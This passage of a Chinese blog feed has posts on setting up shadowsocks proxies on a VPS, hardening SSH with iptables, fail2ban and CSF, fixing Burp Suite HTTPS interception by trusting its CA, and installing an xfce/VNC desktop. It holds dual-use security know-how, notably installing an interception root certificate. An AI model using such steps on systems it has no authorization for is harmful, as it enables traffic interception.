href="http://www.serverspeeder.com/">http://www.serverspeeder.com/</a> 免费注册</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wget http://dl.serverspeeder.com/d/ls/serverSpeederInstaller.tar.gz</span><br><span class="line">tar xzvf serverSpeederInstaller.tar.gz</span><br><span class="line">bash serverSpeederInstaller.sh</span><br><span class="line"></span><br><span class="line">vi /serverspeeder/etc/config</span><br><span class="line">rsc="1"</span><br><span class="line">maxmode="1"</span><br><span class="line">advinacc="1"</span><br><span class="line"></span><br><span class="line">./serverspeeder/bin/serverSpeeder.sh restart</span><br></pre></td></tr></table></figure><h3 id="使用国外-DNS-造成国内网站访问慢的解决方法"><a href="#使用国外-DNS-造成国内网站访问慢的解决方法" class="headerlink" title="使用国外 DNS 造成国内网站访问慢的解决方法"></a>使用国外 DNS 造成国内网站访问慢的解决方法</h3><p>强大虚拟机<br>听说过 <a href="https://www.virtualbox.org/">VirtualBox</a> 吗？开源、免费、强大的虚拟机软件。可以装个最配置非常低下的虚拟机，比如 32 MiB 内存甚至 16 MiB 内存的虚拟机（要知道 <a href="http://blog.kangzj.net/what-can-a-64m-vps-do/">64M 内存的 Linux 已经可以跑 WordPress 这庞然大物了</a>），装个最简单的小 Linux，比如只有 37M 的 Ubuntu Core，然后装上依赖包几乎没有的 dnsmasq，再把 Windows / OS X 的 DNS 设为虚拟机的 IP 地址，于是便可以用了。在当今内存动辄 4 GiB 的情况下，拿 16MiB 内存出来换个更舒畅的上网体验，还是很不错的。</p><p><a href="http://ttt.tt/50/">解决方法详情</a></p><h3 id="非越狱苹果iphone-ipad使用shadowsocks"><a href="#非越狱苹果iphone-ipad使用shadowsocks" class="headerlink" title="非越狱苹果iphone/ipad使用shadowsocks"></a>非越狱苹果iphone/ipad使用shadowsocks</h3><h4 id="直接安装Shadowsocks-App"><a href="#直接安装Shadowsocks-App" class="headerlink" title="直接安装Shadowsocks App"></a>直接安装Shadowsocks App</h4><p>由于iOS自身的限制和Shadowsocks app代理方式的限制，我们必须得让Shadowsocks app一直保持开启才可以实现全局代理。如果通常十分钟以后iOS就会自动退出后台的一些第三方应用，那么Shadowsocks app自然也会被退出。这就导致了我们需要过一会就去打开一次Shadowsocks app。</p><p>iOS 非越狱的话，可以直接安装 Shadowsocks 的 app，下载地址请<a href="https://itunes.apple.com/cn/app/shadowsocks/id665729974?mt=8">摸我</a><br>中国商店如果已经没有的话，需要切换国别/地区，切换时需账户内余额为0。<br>可使用美国账号登陆，想要用中国区itunes的时候，可以随时转回来。</p><ul><li>先到设置里边，iTunes Store 和 App Store，点击你的apple id，进入</li><li>点击查看apple id</li><li>输入密码登陆</li><li>点进去 country/region那里选取美国，然后点 change country or region，一路点agree</li><li>然后还有account setting，重点是city，state，zip，只要这三项对了就没问题了</li><li>再是确定啊，什么的你就成功转成美国账号了</li></ul><p>美国App Store中Shadowsocks还在，下载地址请<a href="https://itunes.apple.com/us/app/shadowsocks/id665729974?ls=1&mt=8">摸我</a></p><p>WiFi设置中，http代理地址<a href="http://127.0.0.1:8090/proxy.pac">http://127.0.0.1:8090/proxy.pac</a></p><h4 id="与电脑中同一局域网内，实现iPhone-iPad全局自动翻墻。"><a href="#与电脑中同一局域网内，实现iPhone-iPad全局自动翻墻。" class="headerlink" title="与电脑中同一局域网内，实现iPhone/iPad全局自动翻墻。"></a>与电脑中同一局域网内，实现iPhone/iPad全局自动翻墻。</h4><ul><li>勾选电脑客户端的“允许来自局域网的连接”。</li><li>获取Pac地址，也很简单。打开我们浏览器，找到这个菜单:工具-Internet选项-链接-局域网设置</li><li>获取本机局域网IP地址。快捷操作方法：WIN+R，输入cmd回车，输入ipconfig回车。找到IPv4地址——— 192.168.1.*** 那个，就是你本机ip地址。</li><li>ipad配置和手机配置。找到WiFi设置，点击你连接上的WiFi后面那个感叹号图标，在最下面，HTTP代理的地方，选择自动，然后在下面填上如 http://你电脑的ip:1080/pac(一般自建端口没改，默认为1080)，接着返回。例如<a href="http://192.168.1.228:1080/pac">http://192.168.1.228:1080/pac</a></li></ul><p>提醒：1、不要把ip地址填错了，是填你小飞机那台电脑的ip；2、国内网站不会翻墻，只是Google、YouTube这些常见的网站会翻墻；3、自定义需要翻墻的网站请手动添加到“小飞机右键-PAC-编辑本地PAC文件”，然后替换掉里面一个网址就行了。4、开小飞机的电脑关机后，需要关闭掉iPhone/iPad的HTTP代理，不然上不去网。</p><p>另外，还可以用百度云存储或者自己的网站空间存储pac文件<br>编辑pac文件，由于iphone/ipad不支持socks代理，我们这里要自己编辑pac文件。新建proxy.pac文件，写入以下代码：</p><p>function FindProxyForURL(url, host) { return “SOCKS 192.168.xxx.xxx:yyyy”; }</p><p>192.168.xxx.xxx就是你电脑的ip,yyyy是你刚才配置shadowsocks客户端的那个重要端口。<br>将proxy上传到云存储，并且复制公开分享的连接,或者你的网站目录中（<a href="http://www.url.com/proxy.pac）">www.url.com/proxy.pac）</a><br>设置 -&gt; 无线局域网-&gt; 点击你连接的无线，在最下边的http代理，选择自动，输入你刚才放置pac文件的地址</p><p>pac文件放在云盘上是不可以的啊！</p><h2 id="Linux-VPS-服务器后简单的安全设置"><a href="#Linux-VPS-服务器后简单的安全设置" class="headerlink" title="Linux VPS 服务器后简单的安全设置"></a>Linux VPS 服务器后简单的安全设置</h2><p>查看尝试暴力破解IP</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cat /var/log/secure|awk '/Failed/&#123;print $(NF-3)&#125;'|sort|uniq -c|awk '&#123;print $2"="$1;&#125;'</span><br></pre></td></tr></table></figure><p>查询出来的结果中包含了“ip地址=数量”就是攻击者信息</p><h3 id="修改默认端口号22"><a href="#修改默认端口号22" class="headerlink" title="修改默认端口号22"></a>修改默认端口号22</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vi /etc/ssh/sshd_config</span><br></pre></td></tr></table></figure><p>找到#port 22<br>将前面的#去掉,然后修改端口 port 12345 （这里的端口可以自己根据实际情况定义）<br>为了保险起见，可以将“#port 22”修改为两行“port 22”“port 1234”，1234测试无误后再删掉”port 22″<br>然后重启ssh服务</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">service sshd restart</span><br></pre></td></tr></table></figure><p>firewall-cmd –zone=public –add-port=1022/tcp –permanent<br>阿里云添加自定义安全规则<a href="https://help.aliyun.com/document_detail/51644.html">https://help.aliyun.com/document_detail/51644.html</a><br><a href="https://linux.cn/article-8098-1.html">https://linux.cn/article-8098-1.html</a></p><h3 id="禁用远程root登录"><a href="#禁用远程root登录" class="headerlink" title="禁用远程root登录"></a>禁用远程root登录</h3><p>root登录直接就获得权限，而且root这个用户名太常见了。在禁用root登录前首先一定要先增加一个普通权限的用户,并设置密码：</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">useradd test</span><br><span class="line">passwd test</span><br></pre></td></tr></table></figure><p>然后禁止ROOT远程SSH登录：</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vi /etc/ssh/sshd_config</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">把其中的</span></span><br><span class="line">PermitRootLogin yes</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">改为</span></span><br><span class="line">PermitRootLogin no</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">如果PermitRootLogin前面的有<span class="comment">#的话也一定要删除掉，否则无法生效。</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">再重启sshd服务</span></span><br><span class="line"></span><br><span class="line">service sshd restart</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">以后我们便可以通过普通权限的ssh账户连接我们的vps，如果需要管理权限的话，可以用下面命令提升到root权限</span></span><br><span class="line">su root</span><br></pre></td></tr></table></figure><p>如果root用户有另外一套密码的话会更加有效。</p><h3 id="使用SSH-Key登录VPS，关闭密码登录"><a href="#使用SSH-Key登录VPS，关闭密码登录" class="headerlink" title="使用SSH Key登录VPS，关闭密码登录"></a>使用SSH Key登录VPS，关闭密码登录</h3><p>1、把自己的公匙放在 <a href="https://launchpad.net/">https://launchpad.net/</a> 网站，并得到类似 <a href="https://launchpad.net/~showfom/+sshkeys">https://launchpad.net/~showfom/+sshkeys</a> 这样的地址，然后通过以下命令导入你的 Key</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl https://launchpad.net/~showfom/+sshkeys &gt; ~/.ssh/authorized_keys</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 如果没有 .ssh 目录，可以新建立一个</span></span><br><span class="line"></span><br><span class="line">mkdir .ssh</span><br></pre></td></tr></table></figure><p>2、也可以直接写入 authorized_keys 文件</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cat &gt;&gt;/root/.ssh/authorized_keys&lt;&lt;EOF</span><br><span class="line"></span><br><span class="line">ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEAna/D52fTZ1YNjxnwAJAUhxRdPCwar8ZfWLdwHEmT64Zqtxrz65KRxesHFRVND8Xn1GKtuQIQMu/d5fFhEajFbjoSw/n+Mz58irzUXDbE34Y/nxy1/iWc6aJz6lX6wT7nnDcVoqX8Be8j/8sjS7cMFarn3Iy+0bSQNON3681+hEFM7mpoYyqrCVBpARfiiEZb8tNkfzrKJFrciZ87yaKkncPeDCIbYKjuJY2hciK+Y+IptLdoMj5kQkSXStJFQUfFg+s3FQJ9Istu4C7BF3ZafD4mEupA7P90RRUjLj95mUW/P/ebWGsMVbnxz/Xmq3OL/TOuo85umbSN44DmSB3NEQ== showfom-rsa-key-20130701</span><br><span class="line">EOF</span><br></pre></td></tr></table></figure><h3 id="shadowsocks的timeout设置"><a href="#shadowsocks的timeout设置" class="headerlink" title="shadowsocks的timeout设置"></a>shadowsocks的timeout设置</h3><p>good, 你已经有了一个自己的shadowsocks代理了，现在想要把这个代理公布出去给所有人分享。<br>但是没有两个小时，代理就没法使用了，为什么？因为你需要额外注意以下事项（以下步骤需要比较高的linux技能）<br>本文只关注于确保shadowsocks服务还“活着”，如果你希望让其跑得更快，请参考<br><a href="https://github.com/clowwindy/shadowsocks/wiki/Optimizing-Shadowsocks">https://github.com/clowwindy/shadowsocks/wiki/Optimizing-Shadowsocks</a></p><p>超时时间越长，连接被保持得也就越长，导致并发的tcp的连接数也就越多。对于公共代理，这个值应该调整得小一些。推荐60秒。</p><h3 id="检查操作系统的各种限制"><a href="#检查操作系统的各种限制" class="headerlink" title="检查操作系统的各种限制"></a>检查操作系统的各种限制</h3><p>对于openvz的vps，特别需要检查一下<br>shell# cat /proc/user_beancounters<br>Version: 2.5<br>uid resource held maxheld barrier limit failcnt<br>1005: kmemsize 6499239 34332672 50331648 50331648 0<br>lockedpages 0 0 12288 12288 0<br>privvmpages 20185 89959 9223372036854775807 9223372036854775807 0<br>shmpages 654 670 9223372036854775807 9223372036854775807 0<br>dummy 0 0 9223372036854775807 9223372036854775807 0<br>numproc 26 102 9223372036854775807 9223372036854775807 0<br>physpages 12181 24887 0 24576 536<br>vmguarpages 0 0 9223372036854775807 9223372036854775807 0<br>oomguarpages 7054 30538 9223372036854775807 9223372036854775807 473<br>numtcpsock 52 1500 1500 2000 21583239<br>numflock 1 5 9223372036854775807 9223372036854775807 0<br>numpty 1 16 9223372036854775807 9223372036854775807 0<br>numsiginfo 0 63 9223372036854775807 9223372036854775807 0<br>tcpsndbuf 7497680 29165536 104857600 209715200 0<br>tcprcvbuf 18891984 88633288 104857600 209715200 0<br>othersockbuf 39304 386848 9223372036854775807 9223372036854775807 0<br>dgramrcvbuf 0 166480 9223372036854775807 9223372036854775807 0<br>numothersock 27 37 1500 2000 0<br>dcachesize 2293779 25165824 25165824 25165824 0<br>numfile 362 1910 9223372036854775807 9223372036854775807 0<br>dummy 0 0 9223372036854775807 9223372036854775807 0<br>dummy 0 0 9223372036854775807 9223372036854775807 0<br>dummy 0 0 9223372036854775807 9223372036854775807 0<br>numiptent 30 30 9223372036854775807 9223372036854775807 0<br>其中 numtcpsock 表示 tcp 连接数。像上面这样的情况，就不适合用于公共代理，因为vps商限制了并发的tcp连接数。<br>shell# ulimit -n<br>1024<br>这个命令检查默认的一个进程可以打开的文件数。1024这个默认值是不够的。推荐设置为8000<br>shell# ulimit -n 8000<br>shell# ss-server -s 0.0.0.0 -p 1080 -k xxxx -m rc4<br>上面启动ss-server的命令只是示意性的，请替换成你自己的启动命令。ulimit的设置是一次性的，每次启动ss-server之前都要设置一下。</p><h3 id="防止vps被用于暴力破解ssh密码等非法行为"><a href="#防止vps被用于暴力破解ssh密码等非法行为" class="headerlink" title="防止vps被用于暴力破解ssh密码等非法行为"></a>防止vps被用于暴力破解ssh密码等非法行为</h3><p>只要shadowsocks被公开出去，肯定会有人拿代理用于暴力破解ssh的密码。<br>推荐你把shadowsocks限制为只允许访问443和80两个端口。如果你不添加这样的限制，<br>很多vps商都会因为ssh连接开得太多而暂停对你的服务。<br>shell# adduser http-ss<br>shell# su http-ss -c “ss-server -s 0.0.0.0 -p 1080 -k xxxx -m rc4”<br>让ss-server以特定的用户启动<br>shell# iptables -t filter -A OUTPUT -d 127.0.0.1 -j ACCEPT<br>shell# iptables -t filter -m owner –uid-owner http-ss -A OUTPUT -p tcp –sport 1080 -j ACCEPT<br>shell# iptables -t filter -m owner –uid-owner http-ss -A OUTPUT -p tcp –dport 80 -j ACCEPT<br>shell# iptables -t filter -m owner –uid-owner http-ss -A OUTPUT -p tcp –dport 443 -j ACCEPT<br>shell# iptables -t filter -m owner –uid-owner http-ss -A OUTPUT -p tcp -j REJECT –reject-with tcp-reset<br>对于http-ss用户，限制其不能访问80,443之外的端口</p><h3 id="防止DMCA-Compliant"><a href="#防止DMCA-Compliant" class="headerlink" title="防止DMCA Compliant"></a>防止DMCA Compliant</h3><p>虽然你已经把shadowsocks限制为只能访问80/443端口，但是对于美国的vps，仍然有额外的一点需要注意。<br>因为美国的vps需要遵从美国的DMCA版权法律，如果该vps被用于bt下载，而且正好遇上了电影公司设置的蜜罐的话，<br>你的vps的ip就会被记录下来。然后DMCA Compliant律师函会被送往你的vps商那，然后就会被停止服务。<br>为了避免shadowsocks帐号被用于bt下载，你不得不对80端口的流量再进一步进行限制<br>shell# apt-get update &amp;&amp; apt-get install -y nginx<br>安装nginx<br>server {<br>listen 127.0.0.1:3128;<br>server_name localhost;<br>resolver 8.8.8.8;<br>location / {<br>set $upstream_host $host;<br>if ($request_uri ~ “^/announce.*”) {<br>return 403;<br>}<br>if ($request_uri ~ “^.<em>torrent.</em>“) {<br>return 403;<br>}<br>proxy_set_header Host $upstream_host;<br>proxy_pass http://$upstream_host;<br>proxy_buffers 8 32k;<br>proxy_buffering off;<br>}<br>}<br>然后配置nginx的server<br>shell# iptables -t nat -m owner –uid-owner http-ss -A OUTPUT -p tcp –dport 80 -j REDIRECT –to-port 3128<br>把所有的80端口流量转到nginx来处理</p><h3 id="denyhosts-防-ssh-破解密码"><a href="#denyhosts-防-ssh-破解密码" class="headerlink" title="denyhosts 防 ssh 破解密码"></a>denyhosts 防 ssh 破解密码</h3><p>考虑到很多人看不懂 user_beancounters 各项的含义，可以解释一下 numtcpsock 表示 tcp 连接数<br>防 ssh 破解密码可以 apt-get install denyhosts<br><a href="https://github.com/denyhosts/denyhosts">denyhosts</a><br><a href="http://www.bootf.com/571.html">通过DenyHosts阻止SSH暴力攻击教程</a><br>很多人用的是网上找的一键安装脚本或者傻瓜教程，他们可能没有能力在此基础上再做其它的修改。不如直接提供一个优化好的一键安装脚本。 或许你可以直接改一改我的这个脚本把端口限制加进去。</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line"></span><br><span class="line">apt-get update</span><br><span class="line">apt-get install -y -qq python-pip python-m2crypto supervisor</span><br><span class="line">pip install shadowsocks</span><br><span class="line"></span><br><span class="line">PORTS_USED=`netstat -antl |grep LISTEN | awk '&#123; print $4 &#125;' | cut -d: -f2|sed '/^$/d'|sort`</span><br><span class="line">PORTS_USED=`echo $PORTS_USED|sed 's/\s/$\|^/g'`</span><br><span class="line">PORTS_USED="^$&#123;PORTS_USED&#125;$"</span><br><span class="line"></span><br><span class="line">SS_PASSWORD=`dd if=/dev/urandom bs=32 count=1 | md5sum | cut -c-32`</span><br><span class="line">SS_PORT=`seq 1025 9000 | grep -v -E "$PORTS_USED" | shuf -n 1`</span><br><span class="line"></span><br><span class="line">wget https://raw.githubusercontent.com/shadowsocks/stackscript/master/shadowsocks.json -O /etc/shadowsocks.json</span><br><span class="line">wget https://raw.githubusercontent.com/shadowsocks/stackscript/master/shadowsocks.conf -O /etc/supervisor/conf.d/shadowsocks.conf</span><br><span class="line">wget https://raw.githubusercontent.com/shadowsocks/stackscript/master/local.conf -O /etc/sysctl.d/local.conf</span><br><span class="line"></span><br><span class="line">sed -i -e s/SS_PASSWORD/$SS_PASSWORD/ /etc/shadowsocks.json</span><br><span class="line">sed -i -e s/SS_PORT/$SS_PORT/ /etc/shadowsocks.json</span><br><span class="line"></span><br><span class="line">sysctl --system</span><br><span class="line"></span><br><span class="line">service supervisor stop</span><br><span class="line">echo 'ulimit -n 51200' &gt;&gt; /etc/default/supervisor</span><br><span class="line">service supervisor start</span><br><span class="line"></span><br><span class="line">supervisorctl reload</span><br></pre></td></tr></table></figure><h3 id="查看TCP连接数"><a href="#查看TCP连接数" class="headerlink" title="查看TCP连接数"></a>查看TCP连接数</h3><p>通过iptables来实现,比如你的shadowsocks本地地址192.168.0.4和端口2009120091端口的统计命令:sudo iptables -I OUTPUT -s 192.168.0.4 -p tcp –sport 20091然后去查看统计tcp连接数信息:sudo iptables -n -v -L -t filter</p><p>正常情况下，Shadowsocks服务监听着外网IP的端口，出网，入网IP均为公网IP，如果可以使Shadowsocks使用独立的IP做出网和入网IP，那要准确统计流量就毫无困难了。</p><p>每个Shadowsocks都分配公网IP，明显不现实。免费且不限制无限使用的IP，恐怕只有内网的IP段了。配合NAT转发，即可通过公网IP链接至Shadowsocks服务。</p><p>步骤：</p><ol><li>添加一个loop back用的内网IP，例如10.10.10.10：</li></ol><p>ifconfig eth0:ss1 10.10.10.10 netmask 255.255.255.0 up<br>如果你的网卡不是eth0，就自行修改为其他的。</p><ol start="2"><li>修改Shadowsocks的配置文件，更改server的IP为内网IP，例如10.10.10.10：</li></ol><p>“server”:”10.10.10.10”,</p><ol start="3"><li>重新启动Shadowsocks服务</li></ol><ol start="4"><li>修改/etc/sysctl.conf，确保：</li></ol><p>net.ipv4.ip_forward<br>的值为1，且未被注释。</p><p>修改完毕后保存，执行</p><p>sysctl -p</p><ol start="5"><li>因为Shadowsocks服务监听的是内网IP，直接通过公网IP链接至Shadowsocks的端口是不行的，因此这里需要使用NAT进行转发，执行：</li></ol><p>iptables -t nat -I PREROUTING -p tcp –dport SHADOWSOCKS监听的端口 -j DNAT –to-destination 10.10.10.10</p><ol start="6"><li>执行下面两个命令，统计Shadowsocks出网和入网的流量：</li></ol><p>iptables -I INPUT -d 10.10.10.10<br>iptables -I OUTPUT -s 10.10.10.10<br>其中INPUT是入网流量，也就是用户连接Shadowsocks后，给服务器发送的数据。OUTPUT是出网流量，也就是服务器给用户发送的数据。</p><p>完成上面的步骤后，执行iptables，使用-v参数即可查看流量使用情况：</p><p>iptables -L -n -v</p><p>最后提醒一下：</p><ol><li><p>使用ifconfig添加的IP只是临时的，重启后会消失，可以修改网卡的配置文件(/etc/network/interfaces或/etc/sysconfig/network-scripts/)添加IP，或者把添加IP的命令加到/etc/rc.local里面。</p></li><li><p>iptables添加的规则要保存，否则重启后会消失。</p></li></ol><h3 id="安装-CSF-防火墙屏蔽尝试入侵服务器的-IP"><a href="#安装-CSF-防火墙屏蔽尝试入侵服务器的-IP" class="headerlink" title="安装 CSF 防火墙屏蔽尝试入侵服务器的 IP"></a>安装 CSF 防火墙屏蔽尝试入侵服务器的 IP</h3><p>CSF 防火墙安装略简单，几个命令即可搞定：</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">rm -fv csf.tgz</span><br><span class="line">wget http://www.configserver.com/free/csf.tgz</span><br><span class="line">tar -xzf csf.tgz</span><br><span class="line">cd csf</span><br><span class="line">sh install.sh</span><br></pre></td></tr></table></figure><p>然后运行</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">perl /usr/local/csf/bin/csftest.pl</span><br></pre></td></tr></table></figure><p>检测是否安装成功</p><p>为了防止系统误屏蔽本地 IP，可以修改 /etc/csf/csf.allow 和 /etc/csf/csf.ignore 文件加入你需要的白名单 IP ，然后用</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">csf -r</span><br></pre></td></tr></table></figure><p>命令重启读取配置文件即可。</p><h3 id="用-iptables-只开启常规端口"><a href="#用-iptables-只开启常规端口" class="headerlink" title="用 iptables 只开启常规端口"></a>用 iptables 只开启常规端口</h3><p>一般我们只需要开启 22, 53， 80， 443 这三个常见的对外开放端口，可以使用如下命令</p><p>清空 iptables 默认规则</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">iptables -F</span><br></pre></td></tr></table></figure><p>允许 22 端口进入和返回</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">iptables -A INPUT -p tcp --dport 22 -j ACCEPT</span><br><span class="line">iptables -A OUTPUT -p tcp --sport 22 -m state --state ESTABLISHED -j ACCEPT</span><br></pre></td></tr></table></figure><p>允许 53 端口，一般作为 DNS 服务使用</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">iptables -A OUTPUT -p udp --dport 53 -j ACCEPT</span><br><span class="line">iptables -A INPUT -p udp --sport 53 -j ACCEPT</span><br></pre></td></tr></table></figure><p>允许本机访问本机</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">iptables -A INPUT -s 127.0.0.1 -d 127.0.0.1 -j ACCEPT</span><br><span class="line">iptables -A OUTPUT -s 127.0.0.1 -d 127.0.0.1 -j ACCEPT</span><br></pre></td></tr></table></figure><p>允许所有 IP 访问 80 和 443 端口，一般作为 http 和 https 用途</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">iptables -A INPUT -p tcp -s 0/0 --dport 80 -j ACCEPT</span><br><span class="line">iptables -A OUTPUT -p tcp --sport 80 -m state --state ESTABLISHED -j ACCEPT</span><br><span class="line">iptables -A INPUT -p tcp -s 0/0 --dport 443 -j ACCEPT</span><br><span class="line">iptables -A OUTPUT -p tcp --sport 443 -m state --state ESTABLISHED -j ACCEPT</span><br></pre></td></tr></table></figure><p>保存配置</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">iptables-save &gt; /etc/sysconfig/iptables</span><br></pre></td></tr></table></figure><p>重新加载 iptables</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">iptables -L</span><br></pre></td></tr></table></figure><h3 id="安装-fail2ban-屏蔽并举报扫描-SSH-端口的-IP"><a href="#安装-fail2ban-屏蔽并举报扫描-SSH-端口的-IP" class="headerlink" title="安装 fail2ban 屏蔽并举报扫描 SSH 端口的 IP"></a>安装 fail2ban 屏蔽并举报扫描 SSH 端口的 IP</h3><p>安装 fail2ban ，屏蔽之余，还能自动写举报信给 IP 所在的 ISP。</p><p>CentOS 下安装：</p><p>导入 epel 源：</p><p>CentOS 6.x 32 位：</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">rpm -Uvh http://download.fedoraproject.org/pub/epel/6/i386/epel-release-6-8.noarch.rpm</span><br></pre></td></tr></table></figure><p>CentOS 6.x 64 位：</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">rpm -Uvh http://download.fedoraproject.org/pub/epel/6/x86_64/epel-release-6-8.noarch.rpm</span><br></pre></td></tr></table></figure><p>安装 fail2ban</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">yum -y install fail2ban</span><br><span class="line">cp /etc/fail2ban/jail.conf /etc/fail2ban/jail.local</span><br><span class="line">service fail2ban start</span><br></pre></td></tr></table></figure><p>Ubuntu / Debian 下安装：</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">apt-get install fail2ban -y</span><br></pre></td></tr></table></figure><p>通过查看 /var/log/fail2ban.log 文件即可知道有哪些精力过剩的家伙在整天扫描你的 SSH 了。</p>]]></content>
      <tags>
        <tag>vps</tag>
        <tag>SS</tag>
      </tags>
  </entry>
  <entry>
    <title>使用Brup拦截HTTPS请求时候的一些问题</title>
    <url>/2016/09/28/burp-https-interception-issues/</url>
    <content><![CDATA[<h2 id="关于Brup"><a href="#关于Brup" class="headerlink" title="关于Brup"></a>关于Brup</h2><p>Brup 是一个可用于执行Web应用程序安全测试的集成平台。可以拦截HTTPS请求，修改浏览器与目标应用程序之间的通信。类似软件还有<a href="https://www.telerik.com/download/fiddler/fiddler4">Fiddler</a>，但是需要安装该软件。<a href="https://portswigger.net/burp/freedownload">Brup免费版</a>是一个jar，可以用于Java环境下直接执行。</p><h2 id="一些问题"><a href="#一些问题" class="headerlink" title="一些问题"></a>一些问题</h2><h3 id="IE中设置代理时，需要设置全局代理"><a href="#IE中设置代理时，需要设置全局代理" class="headerlink" title="IE中设置代理时，需要设置全局代理"></a>IE中设置代理时，需要设置全局代理</h3><p>IE中即是设置局域网(LAN)设置。<br>可排除例外：ctldl.windowsupdate.com;api.bing.com;<em>.microsoft.com;</em>.verisign.com</p><h3 id="安装Brup软件证书到-受信任的根证书颁发机构"><a href="#安装Brup软件证书到-受信任的根证书颁发机构" class="headerlink" title="安装Brup软件证书到 受信任的根证书颁发机构"></a>安装Brup软件证书到 受信任的根证书颁发机构</h3><ol><li><p>开启Brup软件时，使用系统管理员打开IE，输入<code>http://burp/cert</code>，可下载cert.der，然后选中安装到受信任的根证书颁发机构。</p></li><li><p>在警告信息中找到Brup证书，签发者为<code>PortSwigger CA</code>，安装到受信任的根证书颁发机构。</p></li></ol><h3 id="HTTPS仍握手失败-handshake-failure"><a href="#HTTPS仍握手失败-handshake-failure" class="headerlink" title="HTTPS仍握手失败 handshake_failure"></a>HTTPS仍握手失败 handshake_failure</h3><p>已经添加Brup证书仍然提示HTTPS握手失败时<code>Received fatal alert: handshake_failure</code>，检查Burp中的Alerts标签页，查看第一次出现失败提示的下方，是否有提示下载并安装不受限的JCE。</p><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">Attempting <span class="keyword">to</span> auto-select SSL parameters <span class="keyword">for</span> &lt;FQDN&gt;</span><br><span class="line">Failed <span class="keyword">to</span> auto-select SSL parameters <span class="keyword">for</span> &lt;FQDN&gt;</span><br><span class="line">You have limited key lengths available. <span class="keyword">To</span> use stronger keys, please download <span class="keyword">and</span> install the JCE unlimited strength jurisdiction<span class="built_in"> policy </span>files, <span class="keyword">from</span> Oracle.</span><br><span class="line">javax.net.ssl.SSLException:<span class="built_in"> server </span>certificate change is restricted during renegotiation</span><br><span class="line">server certificate change is restricted during renegotiation</span><br></pre></td></tr></table></figure><p>若有，则下载并解压。</p><p><a href="http://www.oracle.com/technetwork/java/embedded/embedded-se/downloads/jce-6-download-429243.html">jdk6中的不受限JCE</a><br><a href="http://www.oracle.com/technetwork/java/embedded/embedded-se/downloads/jce-7-download-432124.html">jdk7中的不受限JCE</a><br><a href="http://www.oracle.com/technetwork/java/javase/downloads/jce8-download-2133166.html">jdk8中的不受限JCE</a></p><p>替换掉使用Java版本中的<code>jre/lib/security</code>路径下的<code>local_policy.jar</code>和<code>US_export_policy.jar</code>两个jar包即可。替换前最好先备份一下。</p>]]></content>
      <tags>
        <tag>网络安全</tag>
        <tag>HTTPS</tag>
      </tags>
  </entry>
  <entry>
    <title>CentOS下安装xfce + vnc桌面 + firefox浏览器</title>
    <url>/2015/10/19/centos-install-xfce-and-vnc-and-firefox/</url>
    <content><![CDATA[<h2 id="安装xfce桌面"><a href="#安装xfce桌面" class="headerlink" title="安装xfce桌面"></a>安装xfce桌面</h2><p>检测系统XFCE版本</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">yum grouplist</span><br></pre></td></tr></table></figure><p>查看是否有xfce-4.4，一般都是这个版本</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">yum groupinstall xfce-4.4</span><br></pre></td></tr></table></figure><p>如果没有，则需要自己下载。</p><p>根据系统版本打开相应的链接：<br>CentOS 5 32位：<a href="http://download.fedoraproject.org/pub/epel/5/i386/">http://download.fedoraproject.org/pub/epel/5/i386/</a><br>CentOS 5 64位：<a href="http://download.fedoraproject.org/pub/epel/5/x86_64/">http://download.fedoraproject.org/pub/epel/5/x86_64/</a><br>CentOS 6 32位：<a href="http://download.fedoraproject.org/pub/epel/6/i386/">http://download.fedoraproject.org/pub/epel/6/i386/</a><br>CentOS 6 64位：<a href="http://download.fedoraproject.org/pub/epel/6/x86_64/">http://download.fedoraproject.org/pub/epel/6/x86_64/</a><br>查找“epel”，应该会找到一个“epel-release-X-X.noarch.rpm”的软件包。下载，安装之。</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# wget http://download.fedoraproject.org/pub/epel/6/x86_64/epel-release-6-8.noarch.rpm</span><br><span class="line"></span><br><span class="line">rpm -ivh epel-release-6-8.noarch.rpm</span><br></pre></td></tr></table></figure><p>！！！上述是下载安装的例子，具体情况请根据自己的系统版本选择！！！</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">yum groupinstall Xfce</span><br><span class="line">yum groupinstall Fonts    （可选安装）</span><br></pre></td></tr></table></figure><p>在安装过程中会出现两次”Is this ok [y/n]”我们只需要输入y且回车就可以。</p><h2 id="安装VNCServer"><a href="#安装VNCServer" class="headerlink" title="安装VNCServer"></a>安装VNCServer</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span 